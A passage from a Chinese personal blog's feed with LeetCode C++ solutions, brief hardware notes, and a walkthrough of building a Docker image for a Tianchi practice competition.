<p><strong>示例：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">s &#x3D; &quot;abaccdeff&quot;</span><br><span class="line">返回 &quot;b&quot;</span><br><span class="line"></span><br><span class="line">s &#x3D; &quot;&quot; </span><br><span class="line">返回 &quot; &quot;</span><br></pre></td></tr></table></figure>
<p><strong>限制：</strong></p>
<p><code>0 &lt;= s 的长度 &lt;= 50000</code></p>
<center>🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️解题过程🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️</center>

<h6 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h6><p><strong>思路：</strong></p>
<p>计数法：对字符串s中的不同字符计数，然后遍历s，依次判断字符是否只出现一次直到找到只出现一次的字符，否则返回单空格字符。</p>
<p><strong>c++代码：</strong>(执行用时140ms，击败38.88%，内存消耗11M，击败19.96%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">char</span> <span class="title">firstUniqChar</span><span class="params">(<span class="built_in">string</span> s)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">unordered_map</span>&lt;<span class="keyword">char</span>,<span class="keyword">int</span>&gt; m;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">char</span> c:s)&#123;</span><br><span class="line">            m[c]++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">char</span> c:s)&#123;</span><br><span class="line">            <span class="keyword">if</span>(m[c]==<span class="number">1</span>)&#123;</span><br><span class="line">                <span class="keyword">return</span> c;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<center>⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳总 结⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳</center>

<h6 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h6><p>没有官方题解，水一道简单题😁</p>
]]></content>
      <categories>
        <category>ACM</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>简单</tag>
      </tags>
  </entry>
  <entry>
    <title>计算机硬件科普</title>
    <url>/2021/01/06/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A1%AC%E4%BB%B6%E7%A7%91%E6%99%AE/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>先记录一些自己平常学到的知识点，后续再统一整理。</p>
<a id="more"></a>
<h6 id="显示器"><a href="#显示器" class="headerlink" title="显示器"></a>显示器</h6><iframe width="560" height="315" src="https://www.youtube.com/embed/SF0SW8pO_OM" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>



<h6 id="独立显卡、核芯显卡、集成显卡"><a href="#独立显卡、核芯显卡、集成显卡" class="headerlink" title="独立显卡、核芯显卡、集成显卡"></a>独立显卡、核芯显卡、集成显卡</h6><p>GPU是显卡上的一块芯片，就像CPU是主板上的一块芯片</p>
<p>性能：(由高到低)：独立显卡（有独立芯片）&gt;核芯显卡（无独立芯片集成在cpu中）&gt;集成显卡（集成在主板上也叫板载显卡）<br>功耗（由高到低）：独立显卡&gt;集成显卡&gt;核芯显卡</p>
<h6 id="内存双通道"><a href="#内存双通道" class="headerlink" title="内存双通道"></a>内存双通道</h6><iframe width="560" height="315" src="https://www.youtube.com/embed/8i1ZaCqPFeU" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>



<h6 id="GPT和MPR分区"><a href="#GPT和MPR分区" class="headerlink" title="GPT和MPR分区"></a>GPT和MPR分区</h6>]]></content>
      <categories>
        <category>计算机科普</category>
      </categories>
      <tags>
        <tag>硬件</tag>
      </tags>
  </entry>
  <entry>
    <title>Docker</title>
    <url>/2021/03/11/Docker/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>安装</p>
<p>ubutun：<code>apt install docker.io</code></p>
<p>验证安装是否成功：<code>docker info</code></p>
<a id="more"></a>
<p><strong>更多学习资料：</strong></p>
<p>第一口docker的感觉——基本知识<br><a href="https://yq.aliyun.com/articles/734130">https://yq.aliyun.com/articles/734130</a><br>第二口docker的感觉 —— Dockerfile<br><a href="https://yq.aliyun.com/articles/735190">https://yq.aliyun.com/articles/735190</a><br>容器镜像服务快速入门<br><a href="https://help.aliyun.com/document_detail/60743.html">https://help.aliyun.com/document_detail/60743.html</a><br>Docker学习路线图<br><a href="https://developer.aliyun.com/article/40494">https://developer.aliyun.com/article/40494</a><br>Docker完全自学手册<br><a href="https://edu.aliyun.com/course/496">https://edu.aliyun.com/course/496</a><br>阿里云容器服务使用教程<br><a href="https://edu.aliyun.com/course/129">https://edu.aliyun.com/course/129</a><br>云原生技术公开课<br><a href="https://edu.aliyun.com/roadmap/cloudnative?#all">https://edu.aliyun.com/roadmap/cloudnative?#all</a><br>云原生圈子<br><a href="https://developer.aliyun.com/group/cloudnative#/?_k=7qpile">https://developer.aliyun.com/group/cloudnative#/?_k=7qpile</a></p>
]]></content>
  </entry>
  <entry>
    <title>天池Docker练习场</title>
    <url>/2021/03/15/%E5%A4%A9%E6%B1%A0Docker%E7%BB%83%E4%B9%A0%E5%9C%BA/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><a href="https://tianchi.aliyun.com/competition/entrance/231759/information">比赛地址</a></p>
<h5 id="任务描述"><a href="#任务描述" class="headerlink" title="任务描述"></a>任务描述</h5><p>参与者可<strong>分阶段</strong>提交容器镜像完成以下3个任务（分数依次占 30/30/40），根据评分系统的分数返回验证任务的完成情况。</p>
<ol>
<li>输出<code>Hello world</code></li>
<li>计算 <code>/tcdata/num_list.csv</code>中一列数字的总和。</li>
<li>在<code>/tcdata/num_list.csv</code>文件中寻找最大的10个数，从大到小生成一个List.</li>
</ol>
<a id="more"></a>
<p><code>num_list.csv</code>文件中只有一列不为负的整数，其中存在重复值，示例如下：</p>
<blockquote>
<p>102<br>6<br>11<br>11</p>
</blockquote>
<p>生成入口脚本<code>run.sh</code>，放置于镜像工作目录。运行后生成结果<code>result.json</code>放置于工作目录（与<code>run.sh</code>同目录），评分系统将根据<code>result.json</code>进行打分。json文件如下所示：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;  </span><br><span class="line">    &quot;Q1&quot;:&quot;Hello world&quot;, </span><br><span class="line">    &quot;Q2&quot;:sum值, </span><br><span class="line">    &quot;Q3&quot;:[top10_list] </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h5><p>在VMWare 虚拟机中打开Ubuntu，新建一个tianchi_submit_demo目录，在其中编辑如下四个文件</p>
<p><img src="/2021/03/15/%E5%A4%A9%E6%B1%A0Docker%E7%BB%83%E4%B9%A0%E5%9C%BA/image-20210315094851351.png" alt="image-20210315094851351"></p>
<p><strong>hello_world.py</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="comment">#data=np.random.randint(1,100,200)</span></span><br><span class="line"><span class="comment">#data=pd.DataFrame(data)</span></span><br><span class="line"><span class="comment">#data.to_csv(&quot;./tcdata/num_list.csv&quot;,index=False,header=False)</span></span><br><span class="line">data=pd.read_csv(<span class="string">&quot;/tcdata/num_list.csv&quot;</span>,header=<span class="literal">None</span>)<span class="comment">#天池python镜像默认包含此文件，自己测试用如下指令</span></span><br><span class="line"><span class="comment">#data=pd.read_csv(&quot;./tcdata/num_list.csv&quot;,header=None)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#第一题</span></span><br><span class="line">result_1=<span class="string">&quot;Hello world&quot;</span></span><br><span class="line"><span class="comment">#第二题</span></span><br><span class="line">result_2=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i,num <span class="keyword">in</span> enumerate(data[<span class="number">0</span>]):</span><br><span class="line">    result_2+=num</span><br><span class="line"><span class="comment">#第三题</span></span><br><span class="line">data.sort_values(by=<span class="number">0</span>,ascending=<span class="literal">False</span>,inplace=<span class="literal">True</span>)</span><br><span class="line">result_3=data[<span class="number">0</span>][:<span class="number">10</span>]</span><br><span class="line">result_3=list(result_3)</span><br><span class="line"></span><br><span class="line">result=&#123;<span class="string">&quot;Q1&quot;</span>:result_1,</span><br><span class="line">        <span class="string">&quot;Q2&quot;</span>:result_2,</span><br><span class="line">        <span class="string">&quot;Q3&quot;</span>:result_3</span><br><span class="line">       &#125;</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">&#x27;result.json&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">json.dump(result, f)</span><br></pre></td></tr></table></figure>
<p><strong>Dockerfile</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># Base Images</span><br><span class="line">## 从天池基础镜像构建</span><br><span class="line">FROM registry.cn-shanghai.aliyuncs.com&#x2F;tcc-public&#x2F;python:3</span><br><span class="line"></span><br><span class="line">## 把当前文件夹里的文件构建到镜像的根目录下（.后面有空格，不能直接跟&#x2F;）</span><br><span class="line">ADD . &#x2F;</span><br><span class="line"></span><br><span class="line">## 指定默认工作目录为根目录（需要把run.sh和生成的结果文件都放在该文件夹下，提交后才能运行）</span><br><span class="line">WORKDIR &#x2F;</span><br><span class="line"></span><br><span class="line">## Install Requirements（requirements.txt包含python包的版本）</span><br><span class="line">## 这里使用清华镜像加速安装</span><br><span class="line">RUN pip install -i https:&#x2F;&#x2F;pypi.tuna.tsinghua.edu.cn&#x2F;simple -r requirements.txt</span><br><span class="line"></span><br><span class="line">## 镜像启动后统一执行 sh run.sh</span><br><span class="line">CMD [&quot;sh&quot;, &quot;run.sh&quot;]</span><br></pre></td></tr></table></figure>
<p><strong>run.sh</strong></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">python hello_world.py</span><br></pre></td></tr></table></figure>
<p><strong>requirements.txt</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pandas&#x3D;&#x3D;0.25.1</span><br><span class="line">numpy&#x3D;&#x3D;1.19.4</span><br></pre></td></tr></table></figure>
<h6 id="构建镜像"><a href="#构建镜像" class="headerlink" title="构建镜像"></a><strong>构建镜像</strong></h6><p>参考<a href="https://tianchi.aliyun.com/competition/entrance/231759/tab/226">手把手教程</a></p>
<p><img src="/2021/03/15/%E5%A4%A9%E6%B1%A0Docker%E7%BB%83%E4%B9%A0%E5%9C%BA/image-20210315095416743.png" alt="image-20210315095416743"></p>
<h6 id="推送到镜像仓库"><a href="#推送到镜像仓库" class="headerlink" title="推送到镜像仓库"></a><strong>推送到镜像仓库</strong></h6><p><img src="/2021/03/15/%E5%A4%A9%E6%B1%A0Docker%E7%BB%83%E4%B9%A0%E5%9C%BA/image-20210315095541391.png" alt="image-20210315095541391"></p>
<h6 id="提交验证运行结果"><a href="#提交验证运行结果" class="headerlink" title="提交验证运行结果"></a><strong>提交验证运行结果</strong></h6><p><img src="/2021/03/15/%E5%A4%A9%E6%B1%A0Docker%E7%BB%83%E4%B9%A0%E5%9C%BA/image-20210315095708687.png" alt="image-20210315095708687"></p>
<p><strong>运行成功</strong></p>
<p><img src="/2021/03/15/%E5%A4%A9%E6%B1%A0Docker%E7%BB%83%E4%B9%A0%E5%9C%BA/image-20210315101638481.png" alt="image-20210315101638481"></p>
<h6 id="更多学习资料："><a href="#更多学习资料：" class="headerlink" title="更多学习资料："></a><strong>更多学习资料：</strong></h6><p>第一口docker的感觉——基本知识<br><a href="https://yq.aliyun.com/articles/734130">https://yq.aliyun.com/articles/734130</a><br>第二口docker的感觉 —— Dockerfile<br><a href="https://yq.aliyun.com/articles/735190">https://yq.aliyun.com/articles/735190</a><br>容器镜像服务快速入门<br><a href="https://help.aliyun.com/document_detail/60743.html">https://help.aliyun.com/document_detail/60743.html</a><br>Docker学习路线图<br><a href="https://developer.aliyun.com/article/40494">https://developer.aliyun.com/article/40494</a><br>Docker完全自学手册<br><a href="https://edu.aliyun.com/course/496">https://edu.aliyun.com/course/496</a><br>阿里云容器服务使用教程<br><a href="https://edu.aliyun.com/course/129">https://edu.aliyun.com/course/129</a><br>云原生技术公开课<br><a href="https://edu.aliyun.com/roadmap/cloudnative?#all">https://edu.aliyun.com/roadmap/cloudnative?#all</a><br>云原生圈子<br><a href="https://developer.aliyun.com/group/cloudnative#/?_k=7qpile">https://developer.aliyun.com/group/cloudnative#/?_k=7qpile</a></p>
]]></content>
      <categories>
        <category>其他</category>
      </categories>
      <tags>
        <tag>天池</tag>
      </tags>
  </entry>
  <entry>
    <title>替换所有的问号</title>
    <url>/2021/03/10/%E6%9B%BF%E6%8D%A2%E6%89%80%E6%9C%89%E7%9A%84%E9%97%AE%E5%8F%B7/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><a href="https://leetcode-cn.com/problems/replace-all-s-to-avoid-consecutive-repeating-characters/"><strong>题目地址</strong></a></p>
<p><strong>难度：</strong>⭐</p>
<h6 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a><strong>题目描述：</strong></h6><p>给你一个仅包含小写英文字母和 <code>&#39;?&#39;</code> 字符的字符串 <code>s</code>，请你将所有的 <code>&#39;?&#39;</code> 转换为若干小写字母，使最终的字符串不包含任何 连续重复 的字符。</p>
<p>注意：你 <strong>不能</strong> 修改非 <code>&#39;?&#39;</code> 字符。</p>
<p>题目测试用例保证 <strong>除</strong> <code>&#39;?&#39;</code> 字符 <strong>之外</strong>，不存在连续重复的字符。</p>
<p>在完成所有转换（可能无需转换）后返回最终的字符串。如果有多个解决方案，请返回其中任何一个。可以证明，在给定的约束条件下，答案总是存在的。</p>
<a id="more"></a>
<p><strong>示例1：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：s &#x3D; &quot;?zs&quot;</span><br><span class="line">输出：&quot;azs&quot;</span><br><span class="line">解释：该示例共有 25 种解决方案，从 &quot;azs&quot; 到 &quot;yzs&quot; 都是符合题目要求的。只有 &quot;z&quot; 是无效的修改，因为字符串 &quot;zzs&quot; 中有连续重复的两个 &#39;z&#39; 。</span><br></pre></td></tr></table></figure>
<p><strong>示例2：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：s &#x3D; &quot;ubv?w&quot;</span><br><span class="line">输出：&quot;ubvaw&quot;</span><br><span class="line">解释：该示例共有 24 种解决方案，只有替换成 &quot;v&quot; 和 &quot;w&quot; 不符合题目要求。因为 &quot;ubvvw&quot; 和 &quot;ubvww&quot; 都包含连续重复的字符。</span><br></pre></td></tr></table></figure>
<p><strong>示例3：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：s &#x3D; &quot;j?qg??b&quot;</span><br><span class="line">输出：&quot;jaqgacb&quot;</span><br></pre></td></tr></table></figure>
<p><strong>示例4：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：s &#x3D; &quot;??yw?ipkj?&quot;</span><br><span class="line">输出：&quot;acywaipkja&quot;</span><br></pre></td></tr></table></figure>
<p><strong>提示：</strong></p>
<ul>
<li><code>1 &lt;= s.length &lt;= 100</code></li>
<li><code>s</code> 仅包含小写英文字母和 <code>&#39;?&#39;</code> 字符</li>
</ul>
<center>🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️解题过程🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️</center>

<h6 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h6><p><strong>思路：</strong>遍历字符串，对其中的’?’字符从’a’开始替换，然后和前后字符进行比较若重复则当前字符加1换成下一个字符。</p>
<p><strong>c++代码：</strong>(执行用时0ms，击败100.00%，内存消耗6M，击败54.83%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="built_in">string</span> <span class="title">modifyString</span><span class="params">(<span class="built_in">string</span> s)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n=s.length();</span><br><span class="line">        <span class="keyword">char</span> tmp=<span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">        <span class="comment">//s长度为1的情况</span></span><br><span class="line">        <span class="keyword">if</span>(n==<span class="number">1</span> &amp;&amp; s[<span class="number">0</span>]==<span class="string">&#x27;?&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;a&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//处理首尾字符为？的情况</span></span><br><span class="line">        <span class="keyword">if</span>(s[<span class="number">0</span>]==<span class="string">&#x27;?&#x27;</span>)&#123;</span><br><span class="line">            s[<span class="number">0</span>]=<span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">            <span class="keyword">if</span>(s[<span class="number">1</span>]==<span class="string">&#x27;a&#x27;</span>)&#123;</span><br><span class="line">                s[<span class="number">0</span>]++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(s[n<span class="number">-1</span>]==<span class="string">&#x27;?&#x27;</span>)&#123;</span><br><span class="line">            s[n<span class="number">-1</span>]=<span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">            <span class="keyword">if</span>(s[n<span class="number">-2</span>]==<span class="string">&#x27;a&#x27;</span>)&#123;</span><br><span class="line">                s[n<span class="number">-1</span>]++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;n<span class="number">-1</span>;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(s[i]==<span class="string">&#x27;?&#x27;</span>)&#123;</span><br><span class="line">                <span class="comment">//使用tmp是考虑到频繁取出s[i]会影响效率</span></span><br><span class="line">                tmp=<span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">                <span class="keyword">while</span>(s[i<span class="number">-1</span>]==tmp || s[i+<span class="number">1</span>]==tmp)&#123;</span><br><span class="line">                    tmp++;</span><br><span class="line">                &#125;</span><br><span class="line">                s[i]=tmp;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> s;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>简化了一下代码如下：</p>
<p><strong>c++代码：</strong>(执行用时0ms，击败100.00%，内存消耗6M，击败60.83%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="built_in">string</span> <span class="title">modifyString</span><span class="params">(<span class="built_in">string</span> s)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n=s.length();</span><br><span class="line">        <span class="keyword">char</span> tmp=<span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">        <span class="comment">//s长度为1的情况</span></span><br><span class="line">        <span class="keyword">if</span>(n==<span class="number">1</span> &amp;&amp; s[<span class="number">0</span>]==<span class="string">&#x27;?&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;a&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(s[i]==<span class="string">&#x27;?&#x27;</span>)&#123;</span><br><span class="line">                <span class="comment">//使用tmp是考虑到频繁取出s[i]会影响效率</span></span><br><span class="line">                tmp=<span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">                <span class="keyword">while</span>(i<span class="number">-1</span>&gt;=<span class="number">0</span>&amp;&amp;s[i<span class="number">-1</span>]==tmp || i+<span class="number">1</span>&lt;n&amp;&amp;s[i+<span class="number">1</span>]==tmp)&#123;</span><br><span class="line">                    tmp++;</span><br><span class="line">                &#125;</span><br><span class="line">                s[i]=tmp;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> s;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<center>⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳总 结⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳</center>

<h6 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h6><p>没有官方题解，简单😃。</p>
]]></content>
      <categories>
        <category>ACM</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>简单</tag>
        <tag>字符串</tag>
      </tags>
  </entry>
  <entry>
    <title>最后一块石头的重量</title>
    <url>/2021/03/08/%E6%9C%80%E5%90%8E%E4%B8%80%E5%9D%97%E7%9F%B3%E5%A4%B4%E7%9A%84%E9%87%8D%E9%87%8F/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><a href="https://leetcode-cn.com/problems/last-stone-weight/"><strong>题目地址</strong></a></p>
<p><strong>难度：</strong>⭐</p>
<h6 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a><strong>题目描述：</strong></h6><p>有一堆石头，每块石头的重量都是正整数。</p>
<p>每一回合，从中选出两块 最重的 石头，然后将它们一起粉碎。假设石头的重量分别为 <code>x</code> 和 <code>y</code>，且 <code>x &lt;= y</code>。那么粉碎的可能结果如下：</p>
<ul>
<li>如果 <code>x == y</code>，那么两块石头都会被完全粉碎；</li>
<li>如果 <code>x != y</code>，那么重量为 <code>x</code> 的石头将会完全粉碎，而重量为 y 的石头新重量为 <code>y-x</code>。</li>
</ul>
<p>最后，最多只会剩下一块石头。返回此石头的重量。如果没有石头剩下，就返回 <code>0</code>。</p>
<a id="more"></a>
<p><strong>示例：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：[2,7,4,1,8,1]</span><br><span class="line">输出：1</span><br><span class="line">解释：</span><br><span class="line">先选出 7 和 8，得到 1，所以数组转换为 [2,4,1,1,1]，</span><br><span class="line">再选出 2 和 4，得到 2，所以数组转换为 [2,1,1,1]，</span><br><span class="line">接着是 2 和 1，得到 1，所以数组转换为 [1,1,1]，</span><br><span class="line">最后选出 1 和 1，得到 0，最终数组转换为 [1]，这就是最后剩下那块石头的重量。</span><br></pre></td></tr></table></figure>
<p><strong>提示：</strong></p>
<ul>
<li><code>1 &lt;= stones.length &lt;= 30</code></li>
<li><code>1 &lt;= stones[i] &lt;= 1000</code></li>
</ul>
<center>🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️解题过程🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️</center>

<h6 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h6><p><strong>思路：</strong></p>
<p>根据题目描述进行模拟，遍历n-1次，每次遍历对石头堆按重量从大到小排序（石头堆石头最多30块），取前两块石头相减。</p>
<p><strong>c++代码：</strong>(执行用时4ms，击败44.52%，内存消耗6M，击败95.96%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">cmp</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b)</span></span>&#123; </span><br><span class="line">        <span class="keyword">return</span> a&gt;b;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">lastStoneWeight</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; stones)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n=stones.size();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n<span class="number">-1</span>;i++)&#123;</span><br><span class="line">            sort(stones.begin(),stones.end(),cmp);</span><br><span class="line">            stones[<span class="number">0</span>]=stones[<span class="number">0</span>]-stones[<span class="number">1</span>];</span><br><span class="line">            stones[<span class="number">1</span>]=<span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> stones[<span class="number">0</span>];        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<center>💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎官 方 题 解💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎</center>

<h6 id="官方题解"><a href="#官方题解" class="headerlink" title="官方题解:"></a><a href="https://leetcode-cn.com/problems/last-stone-weight/solution/zui-hou-yi-kuai-shi-tou-de-zhong-liang-b-xgsx/">官方题解</a>:</h6><p><strong>方法一：最大堆</strong><br>将所有石头的重量放入最大堆中。每次依次从队列中取出最重的两块石头 $a$ 和 $b$，必有$a≥b$。如果 $a&gt;b$，则将新石头 放回到最大堆中；如果 $a=b$，两块石头完全被粉碎，因此不会产生新的石头。重复上述操作，直到剩下的石头少于 2 块。</p>
<p>最终可能剩下 1 块石头，该石头的重量即为最大堆中剩下的元素，返回该元素；也可能没有石头剩下，此时最大堆为空，返回 0。</p>
<p><strong>c++代码：</strong>(执行用时0ms，击败100.00%，内存消耗6M，击败95.00%）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">class Solution &#123;</span><br><span class="line">public:</span><br><span class="line">    int lastStoneWeight(vector&lt;int&gt;&amp; stones) &#123;</span><br><span class="line">        priority_queue&lt;int&gt; q;</span><br><span class="line">        <span class="keyword">for</span> (int s: stones) &#123;</span><br><span class="line">            q.push(s);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (q.size() &gt; <span class="number">1</span>) &#123;</span><br><span class="line">            int a = q.top();</span><br><span class="line">            q.pop();</span><br><span class="line">            int b = q.top();</span><br><span class="line">            q.pop();</span><br><span class="line">            <span class="keyword">if</span> (a &gt; b) &#123;</span><br><span class="line">                q.push(a - b);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return q.empty() ? 0 : q.top();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>复杂度分析</strong></p>
<ul>
<li><p>时间复杂度：$O(nlogn)$，其中 $n$ 是石头数量。每次从队列中取出元素需要花费 $O(logn)$ 的时间，最多共需要粉碎 $n−1$ 次石头。</p>
</li>
<li><p>空间复杂度：$O(n)$。</p>
</li>
</ul>
